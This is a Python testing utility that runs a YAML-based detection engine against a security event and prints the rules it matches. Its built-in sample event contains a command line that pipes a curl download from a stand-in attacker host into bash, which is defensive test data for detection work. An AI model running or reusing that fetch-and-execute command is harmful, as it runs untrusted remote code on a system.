#!/usr/bin/env python3
"""
Manual testing utility for YAML-based Detection Engine.
Runs the YAMLDetectionEngine against a sample event or a JSON file.
"""
import os
import sys
import json
import argparse
from pathlib import Path

# Add the api directory to PYTHONPATH to allow importing app module
current_dir = Path(__file__).parent.parent
sys.path.append(str(current_dir))

try:
    from app.detection.engine.yaml_detection_engine import YAMLDetectionEngine
except ImportError as e:
    print(f"Error importing YAMLDetectionEngine: {e}")
    print(f"PYTHONPATH was: {sys.path}")
    sys.exit(1)

DEFAULT_EVENT = {
  "event": {
    "category": "process",
    "type": "start",
    "action": "execve"
  },
  "process": {
    "name": "bash",
    "command_line": "bash -c curl http://evil.example/payload.sh | bash",
    "parent": {
      "name": "sshd"
    }
  },
  "user": {
    "name": "root"
  },
  "host": {
    "name": "dev-vps"
  },
  "platform": "linux"
}

def main():
    parser = argparse.ArgumentParser(description="Test YAML Detection Engine against an event.")
    parser.add_argument("event_file", nargs="?", help="Path to a JSON file containing the event.")
    parser.add_argument("--unmatched", action="store_true", help="Include unmatched rules in results.")
    parser.add_argument("--disabled", action="store_true", help="Include disabled rules in results.")
    args = parser.parse_args()

    if args.event_file:
        try:
            with open(args.event_file, 'r') as f:
                event = json.load(f)
            print(f"[*] Loaded event from: {args.event_file}")
        except Exception as e:
            print(f"Error loading event file: {e}")
            sys.exit(1)
    else:
        print("[*] No event file provided, using built-in sample event.")
        event = DEFAULT_EVENT

    # Initialize Engine
    engine = YAMLDetectionEngine()

    print("[*] Evaluating event against YAML rules...")
    candidates = engine.evaluate_event(
        event,
        include_disabled=args.disabled,
        return_unmatched=args.unmatched,
        include_suppressed=True
    )

    if not candidates:
        print("[+] No rules matched.")
        return

    print(f"[+] Found {len(candidates)} candidates:")
    print("-" * 50)

    for c in candidates:
        print(f"Rule ID:        {c.rule_id}")
        print(f"Rule Name:      {c.rule_name}")
        print(f"Matched:        {c.matched}")
        print(f"Suppressed:     {c.suppressed}")
        print(f"Severity:       {c.severity}")
        print(f"Risk Score:     {c.risk_score} (Base: {c.base_risk_score})")
        
        if c.match_reasons:
            print("Match Reasons:")
            for reason in c.match_reasons:
                print(f"  - {reason}")
        
        if c.adjustment_reasons:
            print("Adjustment Reasons:")
            for reason in c.adjustment_reasons:
                print(f"  - {reason}")
        
        if c.suppression_reason:
            print(f"Suppression:    {c.suppression_id} - {c.suppression_reason}")

        if c.missing_fields:
            print(f"Missing Fields: {', '.join(c.missing_fields)}")

        if c.errors:
            print(f"Errors:         {', '.join(c.errors)}")

        mitre = c.mitre.get("technique", {})
        if mitre:
            print(f"MITRE:          {mitre.get('id', 'N/A')} - {mitre.get('name', 'N/A')}")
        
        if c.tags:
            print(f"Tags:           {', '.join(c.tags)}")
            
        print("-" * 50)

if __name__ == "__main__":
    main()
